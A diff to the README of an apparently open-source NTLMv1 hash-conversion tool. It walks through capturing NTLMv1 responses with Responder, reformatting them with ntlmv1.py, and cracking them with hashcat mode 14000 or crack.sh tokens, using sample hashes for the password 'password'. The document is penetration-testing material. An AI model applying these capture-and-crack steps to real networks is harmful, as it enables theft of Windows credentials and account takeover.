@@ -1,5 +1,5 @@
 # Dec 10, 2019 Updates
-Yes this is supposedly python 3 compatible, I will likely merge the tools into one in the new year, but until then the mods have not been extensively tested but should work.
+Yes this is supposedly python 3 compatible, I will likely merge the tools into one in the new year, but until then the mods have not been extensively tested but should work. I have also merged ntlmv1 and ntlmv1-ssp
 
 # ntlmv1-multi
 NTLMv1 Multitool
@@ -13,7 +13,7 @@ It is also based on https://hashcat.net/forum/thread-5912.html and https://www.y
 # Usage
 
 ## NTLMv1 without SSP
-To capture use responder with the --lm flag, without --lm you will activate SSP which requires a different tool.
+To capture use responder with the --lm flag, without --lm you will activate ESS/SSP which will take longer to crack
 
 The capture will look like this.
 ```
@@ -28,9 +28,9 @@ The hash portion looks like this
 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
 
-So use the multi tool like so
+So use the multi tool like so (its also python 2 compatible)
 ```
-python ntlmv1.py --nossp hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
+python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
 
 It will output the following data without modifing server challenges etc
@@ -55,6 +55,9 @@ A52B9CDEDAE86934:1122334455667788
 
 To crack with hashcat:
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+
+To Crack with crack.sh use the following token
+NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
 
 Now the first and most important thing is the password used in this case is "password" and we can verify the ntlm hash with
@@ -101,8 +104,8 @@ echo bcba83e6895b9d>>des.cand
 
 And you should have some reversed hashes
 
-## NTLMv1 with SSP
-SSP changes the server challenge, if you see SSP in your responder because you didn't use --lm or the client is set not to give out a LM response then SSP gets engaged.
+## NTLMv1 with ESS/SSP
+SSP changes the server challenge, if you see SSP in your responder because you didn't use --lm or the client is set not to give out a LM response then SSP gets engaged. 
 
 The SSP output looks like this
 ```
@@ -118,9 +121,9 @@ hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F90
 
 The hashcat forums post do not use SSP, so don't try to use the SSP on *NON* SSP hashes, you will see a stackload of zero's and thats how you can tell as the LM Response is mangled.
 
-To use the tool run
+To use the tool run (it is python2 & 3 compatible)
 ```
-python ntlmv1-ssp.py --ssp "hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788"
+python3 ntlmv1.py --ntlmv1 "hashcat::DUSTIN-5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788"
 ```
 
 The tool will output
@@ -144,6 +147,9 @@ To crack with hashcat create a file with the following contents:
 
 To crack with hashcat:
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
+
+To Crack with crack.sh use the following token
+$NETLM$b36d2b9a8607ea77$892F905962F76D323837F613F88DE27C2BBD6C9ABCD021D0
 ```
 
 Now the password we are using in this case is password which has and ntlm hash of ```b4b9b02e6f09a9bd760f388b67351e2b```
@@ -157,7 +163,7 @@ So to calculate the last 4 characters of the ntlm hash for our NTLMv1-SSP chalen
 ./ct3_to_ntlm.bin 2BBD6C9ABCD021D0 1122334455667788 85D5BC2CE95161CD00000000000000000000000000000000
 ```
 
-We must make a hash file with the following content according to the tool which has the modified SRV Challenges to deal with ESS
+We must make a hash file with the following content according to the tool which has the modified SRV Challenges to deal with SSP
 ```
 892F905962F76D32:b36d2b9a8607ea77
 3837F613F88DE27C:b36d2b9a8607ea77
@@ -194,7 +200,7 @@ Now we can crack with hashcat using the following and not waiting 8 days
 ```
 
 ### crack.sh
-A new update, crack.sh token generation will be appended to all ssp requests
+A new update, crack.sh token generation will be appended to all requests
 
 ```
 To Crack with crack.sh use the following token
